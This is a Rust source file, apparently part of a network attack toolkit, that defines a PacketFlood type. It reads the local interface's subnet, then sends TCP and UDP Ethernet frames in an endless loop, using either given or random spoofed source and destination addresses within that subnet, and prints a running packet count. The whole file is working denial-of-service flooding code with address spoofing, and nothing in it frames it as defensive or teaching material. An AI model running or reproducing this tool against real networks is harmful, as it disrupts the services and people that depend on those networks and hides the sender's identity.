use std::net::Ipv4Addr;
use rand::{Rng, rngs::ThreadRng};
use crate::arg_parser::FloodArgs;
use crate::pkt_kit::{PacketBuilder, Layer2PacketSender};
use crate::utils::{get_ipv4_net, inline_display};



pub struct PacketFlood {
    args:      FloodArgs,
    start:     u32,
    end:       u32,
    pkts_sent: usize,
    rng:       ThreadRng,
}


impl PacketFlood {

    pub fn new(args: FloodArgs) -> Self {
        Self {
            args,
            start:     0,
            end:       0,
            pkts_sent: 0,
            rng:       rand::thread_rng(),
        }
    }



    pub fn execute(&mut self){
        self.set_ip_range();
        self.send_endlessly();
    }



    fn set_ip_range(&mut self) {
        let net    = get_ipv4_net(&self.args.iface);
        self.start = net.network().into();
        self.end   = net.broadcast().into();
    }



    fn setup_tools(iface: String) -> (PacketBuilder, Layer2PacketSender) {
        let pkt_builder = PacketBuilder::new(iface.clone(), None);
        let pkt_sender  = Layer2PacketSender::new(iface.clone());
        (pkt_builder, pkt_sender)
    }



    fn send_endlessly(&mut self) {
        let (mut pkt_builder, mut pkt_sender) = Self::setup_tools(self.args.iface.clone());

        loop {
            let src_ip = self.get_src_ip();
            let dst_ip = self.get_dst_ip();
            
            let tcp_pkt = pkt_builder.build_tcp_ether_packet(src_ip, dst_ip);
            pkt_sender.send_layer2_frame(tcp_pkt);

            let udp_pkt = pkt_builder.build_udp_ether_packet(src_ip, dst_ip);
            pkt_sender.send_layer2_frame(udp_pkt);
            
            self.display_progress();
        }
    }



    fn get_src_ip(&mut self) -> Ipv4Addr {
        self.args.src_ip.unwrap_or_else(|| self.get_random_ip())
    }



    fn get_dst_ip(&mut self) -> Ipv4Addr {
        self.args.dst_ip.unwrap_or_else(|| self.get_random_ip())
    }

    

    fn display_progress(&mut self) {
        self.pkts_sent += 2;
        let msg: String = format!("Packets sent: {}", &self.pkts_sent);
        inline_display(msg);
    }


    fn get_random_ip(&mut self) -> Ipv4Addr {
        let rand_num     = self.rng.gen_range(self.start..=self.end);
        let ip: Ipv4Addr = rand_num.into();
        ip
    }

}